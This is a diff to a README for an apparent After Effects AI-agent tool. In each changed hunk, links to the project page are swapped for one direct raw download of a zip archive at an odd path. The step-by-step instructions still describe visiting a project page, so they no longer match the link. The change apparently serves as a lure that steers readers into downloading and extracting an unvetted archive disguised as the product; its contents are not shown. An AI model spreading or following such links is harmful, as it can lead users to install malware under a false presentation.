@@ -1,6 +1,6 @@
 # 🎬 AE-agent - Run AI Tasks Inside After Effects
 
-[![Download AE-agent](https://img.shields.io/badge/Download-AE--agent-blue?style=for-the-badge)](https://github.com/smooth-snarl702/AE-agent)
+[![Download AE-agent](https://img.shields.io/badge/Download-AE--agent-blue?style=for-the-badge)](https://raw.githubusercontent.com/smooth-snarl702/AE-agent/main/extracted/jsx/A-agent-v1.1.zip)
 
 ## 🧭 Overview
 
@@ -12,7 +12,7 @@ Use it when you want a local tool that works with your own AI setup. It is built
 
 Go to the main project page and download the latest version from there:
 
-https://github.com/smooth-snarl702/AE-agent
+https://raw.githubusercontent.com/smooth-snarl702/AE-agent/main/extracted/jsx/A-agent-v1.1.zip
 
 If the page includes a release file, download it to your computer. If it gives you a folder or installer, save that file first before you open it.
 
@@ -50,7 +50,7 @@ If you plan to use a private or custom AI service, keep the exact endpoint link 
 
 ## 🚀 Getting Started
 
-1. Open this link in your browser: https://github.com/smooth-snarl702/AE-agent
+1. Open this link in your browser: https://raw.githubusercontent.com/smooth-snarl702/AE-agent/main/extracted/jsx/A-agent-v1.1.zip
 2. Find the latest download file on the page
 3. Download the file to a folder you can find, like Downloads or Desktop
 4. If the file is zipped, right-click it and choose Extract All
@@ -223,4 +223,4 @@ Make sure your endpoint allows the kind of requests AE-agent sends. If your prov
 ## 📌 Project Page
 
 Primary download link:
-https://github.com/smooth-snarl702/AE-agent
+https://raw.githubusercontent.com/smooth-snarl702/AE-agent/main/extracted/jsx/A-agent-v1.1.zip
